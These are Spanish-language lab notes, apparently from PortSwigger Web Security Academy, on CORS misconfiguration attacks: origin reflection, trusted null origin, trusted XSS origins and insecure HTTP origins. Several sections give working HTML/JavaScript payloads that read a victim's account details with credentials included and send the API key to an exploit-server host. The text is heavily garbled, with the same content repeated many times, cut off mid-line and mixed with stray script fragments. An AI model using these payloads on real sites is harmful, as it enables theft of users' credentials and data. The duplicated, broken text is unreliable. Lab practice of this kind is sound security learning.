
- URL validationbypass cheat sheet -> https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

Por defecto los navegadores configuran un `Same-Origin Policy` (SOP), la cual no bloquea peticiones `Cross-origin`, si no que impide que el JavaScript del sitio del atacante pueda leer la respuesta si el origen es distinto. 

Sin embargo cuando se necesita que un dominio externo pueda leer datos, el servidor debe habilitarlo mediante `CORS`. 

Si `CORS` esta mal configurado (por ejemplo acepta cualquier origen sin validación), un atacante puede hacer que el navegador de la victima envíe peticiones con sus credenciales a la aplicación vulnerable y leer la información desde un dominio malisioso. 

- `Access-Control-Allow-Origin` → qué dominio puede leer la respuesta. "Es la más importante"
- `Access-Control-Allow-Credentials` → si puede enviar cookies/tokens.
- `Access-Control-Allow-Methods` → qué métodos HTTP se permiten.
- `Access-Control-Allow-Headers` → qué cabeceras extra se aceptan.

CORS se configura a nivel de servidor, sin embargo muchos frameworks permiten sobrescribir o personalizar CORS por cada endpoint o path. 

## CORS vulnerability with basic origin reflection

Header `Access-Control-Allow-Origin` generado por el servidor a partir del header `Origin` especificado por el cliente. Es decir poner cualquier valor dependiendo de lo que se envíe en `Origin`

![Pasted image 20250910154505.png](img/
________
-_URL_validationbypass_cheat_sheet_->_https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

Por_defecto_los_navegadores_configuran_un_`Same-Origin_Policy`_(SOP), la cual no bloquea peticiones `Cross-origin`, si no que impide que el JavaScript del sitio del atacante pueda leer la respuesta si el origen es distinto. 

Sin embargo cuando se necesita que un dominio externo pueda leer datos, el servidor debe habilitarlo mediante `CORS`. 

Si `CORS` esta mal configurado (por ejemplo acepta cualquier origen sin validación), un atacante puede hacer que el navegador de la victima envíe peticiones con sus credenciales a la aplicación vulnerable y leer la información desde un dominio malisioso. 

- `Access-Control-Allow-Origin` → qué dominio puede leer la respuesta. "Es la más importante"
- `Access-Control-Allow-Credentials` → si puede enviar cookies/tokens.
- `Access-Control-Allow-Methods` → qué métodos HTTP se permiten.
- `Access-Control-Allow-Headers` → qué cabeceras extra se aceptan.

CORS se configura a nivel de servidor, sin embargo muchos frameworks permiten sobrescribir o personalizar CORS por cada endpoint o path. 

## CORS vulnerability with basic origin reflection

Header `Access-Control-Allow-Origin` generado por el servidor a partir del header `Origin` especificado por el cliente. Es decir poner cualquier valor dependiendo de lo que se envíe en `Origin`

![Pasted image 20250910154505.png](img/Pasted_image_20250910154505.png)

Payload
```html
<script> 
    fetch("https://0a6500c1044e32cb812d0c9e00400029.web-security-academy.net/accountDetails", {
        credentials: "include"
        })
    .then(res => res.json()) 
    .then(data => {
        const url = "https://exploit-0a9500c0046832f081030b4701890058.exploit-server.net/exploit?apikey=" + encodeURIComponent(data.apikey);  
        fetch(url); 
    }); 
</script> 
```

## CORS vulnerability with trusted null origin 

Puede que cuando se manejen whitelist se tenga aceptado el `Origin: null`
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get', 'https://0a3c00b703c6749d816316ff00310028.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(); function reqListener() { var data = JSON.parse(this.responseText); location='https://exploit-0a5500cf0386747c81d21513019d004a.exploit-server.net/exploit?apikey='+encodeURIComponent(data.apikey); }; </script>"></iframe>
```

## Exploiting XSS via CORS trus relationships

Cuando un sitio `https://banco.com` tiene en su configuración CORS un `Access-Control-Allow-Origin: cloudflare.com` si el sitio puesto en el `Acess-Control-Allow-Origin` es vulnerable a XSS se podría leer datos del sitio `https://banco.com`. 

Request
```
GET /api/requestApiKey HTTP/1.1 
Host: banco.com
Origin: https://cloudflare.com
Cookie: sessionid=...
```

Response
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://cloudflare.com
Access-Control-Allow-Credentials: true
```

Payload
```url
https://cloudflare.com/?xss=<script>cors-stuff-here</script>
```


## CORS vulnerability with trusted insecure protocols

Si un sitio permite en su configuración CORS en `Access-Control-Allow-Origin: http://nocifrado.com` 

Se puede interceptar el trafico para que cuando la victima visite (o forzar a que la victima visite) el dominio http, el atacante modifique la respuesta ya que viaja por http para que cuando el servidor http entregue la web al cliente el navegador del cliente ejecute el JavaScript malicioso. 

Se identifica que la aplicación permite un `Access-Control-Allow-Origin` para una aplicación que funciona en `http`
![Pasted image 20250910182413.png](img/Pasted_image_20250910182413.png)

Se identifico un subdominio que funciona por HTTP y que es vulnerable a XSS
![Pasted image 20250910182523.png](img/Pasted_image_20250910182523.png)
![Pasted image 20250910182553.png](img/Pasted_image_20250910182553.png)

Se entrego a la victima el siguiente payload
```html
<script>document.location = "http://stock.0a71003404e7df7580331ce100cc00c1.web-security-academy.net/?productId=1<script>fetch('https://0a71003404e7df7580331ce100cc00c1.web-security-academy.net/accountDetails', {credentials: 'include'}).then(r => r.json()).then(data => {const url = 'https://exploit-0a7a00740420dfef80fb1bc9017b0010.exploit-server.net/exploit?apikey='%2bencodeURIComponent(data.apikey); fetch(url)});%3c/script>&storeId=2"</script>
``` -replace " ", "_"
    )

Payload
```html
<script> 
    fetch("https://0a6500c1044e32cb812d0c9e00400029.web-security-academy.net/accountDetails", {
        credentials: "include"
        })
    .then(res => res.json()) 
    .then(data => {
        const url = "https://exploit-0a9500c0046832f081030b4701890058.exploit-server.net/exploit?apikey=" + encodeURIComponent(data.apikey);  
        fetch(url); 
    }); 
</script> 
```

## CORS vulnerability with trusted null origin 

Puede que cuando se manejen whitelist se tenga aceptado el `Origin: null`
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get', 'https://0a3c00b703c6749d816316ff00310028.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(); function reqListener() { var data = JSON.parse(this.responseText); location='https://exploit-0a5500cf0386747c81d21513019d004a.exploit-server.net/exploit?apikey='+encodeURIComponent(data.apikey); }; </script>"></iframe>
```

## Exploiting XSS via CORS trus relationships

Cuando un sitio `https://banco.com` tiene en su configuración CORS un `Access-Control-Allow-Origin: cloudflare.com` si el sitio puesto en el `Acess-Control-Allow-Origin` es vulnerable a XSS se podría leer datos del sitio `https://banco.com`. 

Request
```
GET /api/requestApiKey HTTP/1.1 
Host: banco.com
Origin: https://cloudflare.com
Cookie: sessionid=...
```

Response
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://cloudflare.com
Access-Control-Allow-Credentials: true
```

Payload
```url
https://cloudflare.com/?xss=<script>cors-stuff-here</script>
```


## CORS vulnerability with trusted insecure protocols

Si un sitio permite en su configuración CORS en `Access-Control-Allow-Origin: http://nocifrado.com` 

Se puede interceptar el trafico para que cuando la victima visite (o forzar a que la victima visite) el dominio http, el atacante modifique la respuesta ya que viaja por http para que cuando el servidor http entregue la web al cliente el navegador del cliente ejecute el JavaScript malicioso. 

Se identifica que la aplicación permite un `Access-Control-Allow-Origin` para una aplicación que funciona en `http`
![Pasted image 20250910182413.png](img/
________
-_URL_validationbypass_cheat_sheet_->_https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

Por_defecto_los_navegadores_configuran_un_`Same-Origin_Policy`_(SOP), la cual no bloquea peticiones `Cross-origin`, si no que impide que el JavaScript del sitio del atacante pueda leer la respuesta si el origen es distinto. 

Sin embargo cuando se necesita que un dominio externo pueda leer datos, el servidor debe habilitarlo mediante `CORS`. 

Si `CORS` esta mal configurado (por ejemplo acepta cualquier origen sin validación), un atacante puede hacer que el navegador de la victima envíe peticiones con sus credenciales a la aplicación vulnerable y leer la información desde un dominio malisioso. 

- `Access-Control-Allow-Origin` → qué dominio puede leer la respuesta. "Es la más importante"
- `Access-Control-Allow-Credentials` → si puede enviar cookies/tokens.
- `Access-Control-Allow-Methods` → qué métodos HTTP se permiten.
- `Access-Control-Allow-Headers` → qué cabeceras extra se aceptan.

CORS se configura a nivel de servidor, sin embargo muchos frameworks permiten sobrescribir o personalizar CORS por cada endpoint o path. 

## CORS vulnerability with basic origin reflection

Header `Access-Control-Allow-Origin` generado por el servidor a partir del header `Origin` especificado por el cliente. Es decir poner cualquier valor dependiendo de lo que se envíe en `Origin`

![Pasted image 20250910154505.png](img/Pasted_image_20250910154505.png)

Payload
```html
<script> 
    fetch("https://0a6500c1044e32cb812d0c9e00400029.web-security-academy.net/accountDetails", {
        credentials: "include"
        })
    .then(res => res.json()) 
    .then(data => {
        const url = "https://exploit-0a9500c0046832f081030b4701890058.exploit-server.net/exploit?apikey=" + encodeURIComponent(data.apikey);  
        fetch(url); 
    }); 
</script> 
```

## CORS vulnerability with trusted null origin 

Puede que cuando se manejen whitelist se tenga aceptado el `Origin: null`
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get', 'https://0a3c00b703c6749d816316ff00310028.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(); function reqListener() { var data = JSON.parse(this.responseText); location='https://exploit-0a5500cf0386747c81d21513019d004a.exploit-server.net/exploit?apikey='+encodeURIComponent(data.apikey); }; </script>"></iframe>
```

## Exploiting XSS via CORS trus relationships

Cuando un sitio `https://banco.com` tiene en su configuración CORS un `Access-Control-Allow-Origin: cloudflare.com` si el sitio puesto en el `Acess-Control-Allow-Origin` es vulnerable a XSS se podría leer datos del sitio `https://banco.com`. 

Request
```
GET /api/requestApiKey HTTP/1.1 
Host: banco.com
Origin: https://cloudflare.com
Cookie: sessionid=...
```

Response
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://cloudflare.com
Access-Control-Allow-Credentials: true
```

Payload
```url
https://cloudflare.com/?xss=<script>cors-stuff-here</script>
```


## CORS vulnerability with trusted insecure protocols

Si un sitio permite en su configuración CORS en `Access-Control-Allow-Origin: http://nocifrado.com` 

Se puede interceptar el trafico para que cuando la victima visite (o forzar a que la victima visite) el dominio http, el atacante modifique la respuesta ya que viaja por http para que cuando el servidor http entregue la web al cliente el navegador del cliente ejecute el JavaScript malicioso. 

Se identifica que la aplicación permite un `Access-Control-Allow-Origin` para una aplicación que funciona en `http`
![Pasted image 20250910182413.png](img/Pasted_image_20250910182413.png)

Se identifico un subdominio que funciona por HTTP y que es vulnerable a XSS
![Pasted image 20250910182523.png](img/Pasted_image_20250910182523.png)
![Pasted image 20250910182553.png](img/Pasted_image_20250910182553.png)

Se entrego a la victima el siguiente payload
```html
<script>document.location = "http://stock.0a71003404e7df7580331ce100cc00c1.web-security-academy.net/?productId=1<script>fetch('https://0a71003404e7df7580331ce100cc00c1.web-security-academy.net/accountDetails', {credentials: 'include'}).then(r => r.json()).then(data => {const url = 'https://exploit-0a7a00740420dfef80fb1bc9017b0010.exploit-server.net/exploit?apikey='%2bencodeURIComponent(data.apikey); fetch(url)});%3c/script>&storeId=2"</script>
``` -replace " ", "_"
    )

Se identifico un subdominio que funciona por HTTP y que es vulnerable a XSS
![Pasted image 20250910182523.png](img/
________
-_URL_validationbypass_cheat_sheet_->_https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

Por_defecto_los_navegadores_configuran_un_`Same-Origin_Policy`_(SOP), la cual no bloquea peticiones `Cross-origin`, si no que impide que el JavaScript del sitio del atacante pueda leer la respuesta si el origen es distinto. 

Sin embargo cuando se necesita que un dominio externo pueda leer datos, el servidor debe habilitarlo mediante `CORS`. 

Si `CORS` esta mal configurado (por ejemplo acepta cualquier origen sin validación), un atacante puede hacer que el navegador de la victima envíe peticiones con sus credenciales a la aplicación vulnerable y leer la información desde un dominio malisioso. 

- `Access-Control-Allow-Origin` → qué dominio puede leer la respuesta. "Es la más importante"
- `Access-Control-Allow-Credentials` → si puede enviar cookies/tokens.
- `Access-Control-Allow-Methods` → qué métodos HTTP se permiten.
- `Access-Control-Allow-Headers` → qué cabeceras extra se aceptan.

CORS se configura a nivel de servidor, sin embargo muchos frameworks permiten sobrescribir o personalizar CORS por cada endpoint o path. 

## CORS vulnerability with basic origin reflection

Header `Access-Control-Allow-Origin` generado por el servidor a partir del header `Origin` especificado por el cliente. Es decir poner cualquier valor dependiendo de lo que se envíe en `Origin`

![Pasted image 20250910154505.png](img/Pasted_image_20250910154505.png)

Payload
```html
<script> 
    fetch("https://0a6500c1044e32cb812d0c9e00400029.web-security-academy.net/accountDetails", {
        credentials: "include"
        })
    .then(res => res.json()) 
    .then(data => {
        const url = "https://exploit-0a9500c0046832f081030b4701890058.exploit-server.net/exploit?apikey=" + encodeURIComponent(data.apikey);  
        fetch(url); 
    }); 
</script> 
```

## CORS vulnerability with trusted null origin 

Puede que cuando se manejen whitelist se tenga aceptado el `Origin: null`
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get', 'https://0a3c00b703c6749d816316ff00310028.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(); function reqListener() { var data = JSON.parse(this.responseText); location='https://exploit-0a5500cf0386747c81d21513019d004a.exploit-server.net/exploit?apikey='+encodeURIComponent(data.apikey); }; </script>"></iframe>
```

## Exploiting XSS via CORS trus relationships

Cuando un sitio `https://banco.com` tiene en su configuración CORS un `Access-Control-Allow-Origin: cloudflare.com` si el sitio puesto en el `Acess-Control-Allow-Origin` es vulnerable a XSS se podría leer datos del sitio `https://banco.com`. 

Request
```
GET /api/requestApiKey HTTP/1.1 
Host: banco.com
Origin: https://cloudflare.com
Cookie: sessionid=...
```

Response
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://cloudflare.com
Access-Control-Allow-Credentials: true
```

Payload
```url
https://cloudflare.com/?xss=<script>cors-stuff-here</script>
```


## CORS vulnerability with trusted insecure protocols

Si un sitio permite en su configuración CORS en `Access-Control-Allow-Origin: http://nocifrado.com` 

Se puede interceptar el trafico para que cuando la victima visite (o forzar a que la victima visite) el dominio http, el atacante modifique la respuesta ya que viaja por http para que cuando el servidor http entregue la web al cliente el navegador del cliente ejecute el JavaScript malicioso. 

Se identifica que la aplicación permite un `Access-Control-Allow-Origin` para una aplicación que funciona en `http`
![Pasted image 20250910182413.png](img/Pasted_image_20250910182413.png)

Se identifico un subdominio que funciona por HTTP y que es vulnerable a XSS
![Pasted image 20250910182523.png](img/Pasted_image_20250910182523.png)
![Pasted image 20250910182553.png](img/Pasted_image_20250910182553.png)

Se entrego a la victima el siguiente payload
```html
<script>document.location = "http://stock.0a71003404e7df7580331ce100cc00c1.web-security-academy.net/?productId=1<script>fetch('https://0a71003404e7df7580331ce100cc00c1.web-security-academy.net/accountDetails', {credentials: 'include'}).then(r => r.json()).then(data => {const url = 'https://exploit-0a7a00740420dfef80fb1bc9017b0010.exploit-server.net/exploit?apikey='%2bencodeURIComponent(data.apikey); fetch(url)});%3c/script>&storeId=2"</script>
``` -replace " ", "_"
    )
![Pasted image 20250910182553.png](img/
________
-_URL_validationbypass_cheat_sheet_->_https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

Por_defecto_los_navegadores_configuran_un_`Same-Origin_Policy`_(SOP), la cual no bloquea peticiones `Cross-origin`, si no que impide que el JavaScript del sitio del atacante pueda leer la respuesta si el origen es distinto. 

Sin embargo cuando se necesita que un dominio externo pueda leer datos, el servidor debe habilitarlo mediante `CORS`. 

Si `CORS` esta mal configurado (por ejemplo acepta cualquier origen sin validación), un atacante puede hacer que el navegador de la victima envíe peticiones con sus credenciales a la aplicación vulnerable y leer la información desde un dominio malisioso. 

- `Access-Control-Allow-Origin` → qué dominio puede leer la respuesta. "Es la más importante"
- `Access-Control-Allow-Credentials` → si puede enviar cookies/tokens.
- `Access-Control-Allow-Methods` → qué métodos HTTP se permiten.
- `Access-Control-Allow-Headers` → qué cabeceras extra se aceptan.

CORS se configura a nivel de servidor, sin embargo muchos frameworks permiten sobrescribir o personalizar CORS por cada endpoint o path. 

## CORS vulnerability with basic origin reflection

Header `Access-Control-Allow-Origin` generado por el servidor a partir del header `Origin` especificado por el cliente. Es decir poner cualquier valor dependiendo de lo que se envíe en `Origin`

![Pasted image 20250910154505.png](img/Pasted_image_20250910154505.png)

Payload
```html
<script> 
    fetch("https://0a6500c1044e32cb812d0c9e00400029.web-security-academy.net/accountDetails", {
        credentials: "include"
        })
    .then(res => res.json()) 
    .then(data => {
        const url = "https://exploit-0a9500c0046832f081030b4701890058.exploit-server.net/exploit?apikey=" + encodeURIComponent(data.apikey);  
        fetch(url); 
    }); 
</script> 
```

## CORS vulnerability with trusted null origin 

Puede que cuando se manejen whitelist se tenga aceptado el `Origin: null`
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get', 'https://0a3c00b703c6749d816316ff00310028.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(); function reqListener() { var data = JSON.parse(this.responseText); location='https://exploit-0a5500cf0386747c81d21513019d004a.exploit-server.net/exploit?apikey='+encodeURIComponent(data.apikey); }; </script>"></iframe>
```

## Exploiting XSS via CORS trus relationships

Cuando un sitio `https://banco.com` tiene en su configuración CORS un `Access-Control-Allow-Origin: cloudflare.com` si el sitio puesto en el `Acess-Control-Allow-Origin` es vulnerable a XSS se podría leer datos del sitio `https://banco.com`. 

Request
```
GET /api/requestApiKey HTTP/1.1 
Host: banco.com
Origin: https://cloudflare.com
Cookie: sessionid=...
```

Response
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://cloudflare.com
Access-Control-Allow-Credentials: true
```

Payload
```url
https://cloudflare.com/?xss=<script>cors-stuff-here</script>
```


## CORS vulnerability with trusted insecure protocols

Si un sitio permite en su configuración CORS en `Access-Control-Allow-Origin: http://nocifrado.com` 

Se puede interceptar el trafico para que cuando la victima visite (o forzar a que la victima visite) el dominio http, el atacante modifique la respuesta ya que viaja por http para que cuando el servidor http entregue la web al cliente el navegador del cliente ejecute el JavaScript malicioso. 

Se identifica que la aplicación permite un `Access-Control-Allow-Origin` para una aplicación que funciona en `http`
![Pasted image 20250910182413.png](img/Pasted_image_20250910182413.png)

Se identifico un subdominio que funciona por HTTP y que es vulnerable a XSS
![Pasted image 20250910182523.png](img/Pasted_image_20250910182523.png)
![Pasted image 20250910182553.png](img/Pasted_image_20250910182553.png)

Se entrego a la victima el siguiente payload
```html
<script>document.location = "http://stock.0a71003404e7df7580331ce100cc00c1.web-security-academy.net/?productId=1<script>fetch('https://0a71003404e7df7580331ce100cc00c1.web-security-academy.net/accountDetails', {credentials: 'include'}).then(r => r.json()).then(data => {const url = 'https://exploit-0a7a00740420dfef80fb1bc9017b0010.exploit-server.net/exploit?apikey='%2bencodeURIComponent(data.apikey); fetch(url)});%3c/script>&storeId=2"</script>
``` -replace " ", "_"
    )

Se entrego a la victima el siguiente payload
```html
<script>document.location = "http://stock.0a71003404e7df7580331ce100cc00c1.web-security-academy.net/?productId=1<script>fetch('https://0a71003404e7df7580331ce100cc00c1.web-security-academy.net/accountDetails', {credentials: 'include'}).then(r => r.json()).then(data => {const url = 'https://exploit-0a7a00740420dfef80fb1bc9017b0010.exploit-server.net/exploit?apikey='%2bencodeURIComponent(data.apikey); fetch(url)});%3c/script>&storeId=2"</script>
```

